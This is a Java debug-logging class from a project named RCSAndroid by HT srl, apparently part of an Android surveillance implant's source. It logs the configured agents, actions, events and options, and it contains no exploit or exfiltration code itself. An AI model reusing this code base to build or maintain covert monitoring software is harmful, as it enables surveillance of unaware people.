/***********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 06-dec-2010
 **********************************************/

package com.ht.RCSAndroidGUI;

import android.util.Log;

import com.ht.RCSAndroidGUI.action.Action;
import com.ht.RCSAndroidGUI.action.SubAction;
import com.ht.RCSAndroidGUI.agent.AgentConf;
import com.ht.RCSAndroidGUI.conf.Option;
import com.ht.RCSAndroidGUI.event.EventConf;

// Debugging class
/**
 * The Class Debug.
 */

public class Debug {

	private static final String TAG = "Debug";
	/** The enabled. */
	private static boolean enabled;
	/** The name. */
	private final String name;

	/**
	 * Instantiates a new debug.
	 */
	public Debug() {
		this(TAG);
	}

	/**
	 * Instantiates a new debug.
	 * 
	 * @param name
	 *            the name
	 */
	@Deprecated
	public Debug(final String name) {
		enabled = true;
		this.name = name;
	}

	/**
	 * Status actions.
	 */
	public static void StatusActions() {
		final Status statusObj = Status.self();

		Log.d(TAG, "DEBUG - Status Actions Begins");

		try {
			for (int i = 0; i < statusObj.getActionsNumber(); i++) {
				final Action a = statusObj.getAction(i);

				Log.d(TAG, "Action Id: " + a.getId() + " sub num: "
						+ a.getSubActionsNum());

				for (int j = 0; j < a.getSubActionsNum(); j++) {
					final SubAction s = a.getSubAction(j);

					Log.d(TAG, "  -> SubAction " + j + " Type: "
							+ s.getSubActionType() + " Params len: "
							+ s.getSubActionParams().length);
				}
			}
		} catch (final RCSException rcse) {
			rcse.printStackTrace();
			Log.d(TAG, "RCSException detected in Debug.StatusActions()");
		}

		Log.d(TAG, "DEBUG - Status Actions Ends");
	}

	/**
	 * Status agents.
	 */
	public static void StatusAgents() {
		final Status statusObj = Status.self();

		Log.d(TAG, "DEBUG - Status Agents Begins");

		int agentsNumber = statusObj.getAgentsNumber();

		// AGENT_APPLICATION is the actual last agent
		for (int i = 0; i < agentsNumber && i < AgentConf.AGENT_APPLICATION + 2; i++) {
			try {
				final AgentConf a = statusObj.getAgent(AgentConf.AGENT + i + 1);

				Log.d(TAG, "Agent Id: " + a.getId() + " Params len: "
						+ a.getParams().length);
			} catch (final RCSException rcse) {
				// No need to print that this agent doesn't exist
				agentsNumber++;
			}
		}

		Log.d(TAG, "DEBUG - Status Agents Ends");
	}

	/**
	 * Status events.
	 */
	public static void StatusEvents() {
		final Status statusObj = Status.self();

		Log.d(TAG, "DEBUG - Status Events Begins");

		for (int i = 0; i < statusObj.getEventsNumber(); i++) {
			try {
				final EventConf e = statusObj.getEvent(i);

				Log.d(TAG, "Event Id: " + e.getId() + " Event Type: "
						+ e.getType() + " Params len: " + e.getParams().length);
			} catch (final RCSException rcse) {
				// No need to print that this agent doesn't exist
			}
		}

		Log.d(TAG, "DEBUG - Status Events Ends");
	}

	/**
	 * Status options.
	 */
	public static void StatusOptions() {
		final Status statusObj = Status.self();

		Log.d(TAG, "DEBUG - Status Options Begins");

		int optionsNumber = statusObj.getOptionssNumber();

		// CONFIGURATION_WIFIIP is the actual last option
		for (int i = 0; i < optionsNumber
				&& i < Option.CONFIGURATION_WIFIIP + 2; i++) {
			try {
				final Option o = statusObj.getOption(Option.CONFIGURATION + i
						+ 1);

				Log.d(TAG, "Option Id: " + o.getId() + " Option Type: "
						+ " Params len: " + o.getParams().length);
			} catch (final RCSException rcse) {
				// No need to print that this agent doesn't exist
				optionsNumber++;
			}
		}

		Log.d(TAG, "DEBUG - Status Options Ends");
	}

	/**
	 * Compatibilita' bb.
	 * 
	 * @param string
	 *            the string
	 */
	@Deprecated
	public void trace(final String string) {
		if (enabled) {
			Log.d(name, string);
		}
	}

	/**
	 * Error.
	 * 
	 * @param ex
	 *            the ex
	 */
	@Deprecated
	public void error(final Exception ex) {
		if (enabled) {
			Log.d(name, "ERROR: " +ex.toString());
		}
	}

	/**
	 * Error.
	 * 
	 * @param string
	 *            the string
	 */
	@Deprecated
	public void error(final String string) {
		if (enabled) {
			Log.d(name,"ERROR: " + string);
		}
	}

	/**
	 * Warn.
	 * 
	 * @param string
	 *            the string
	 */
	public void warn(final String string) {
		if (enabled) {
			Log.d(name, "WARN: " + string);
		}
	}

	/**
	 * Info.
	 * 
	 * @param string
	 *            the string
	 */
	@Deprecated
	public void info(final String string) {
		if (enabled) {
			Log.d(name, "INFO: " + string);
		}
	}

	/**
	 * Fatal.
	 * 
	 * @param string
	 *            the string
	 */
	@Deprecated
	public void fatal(final String string) {
		if (enabled) {
			Log.d(name, "FATAL: " + string);
		}
	}

	/**
	 * Disable.
	 */
	@Deprecated
	public static void disable() {
		enabled = false;
	}
}
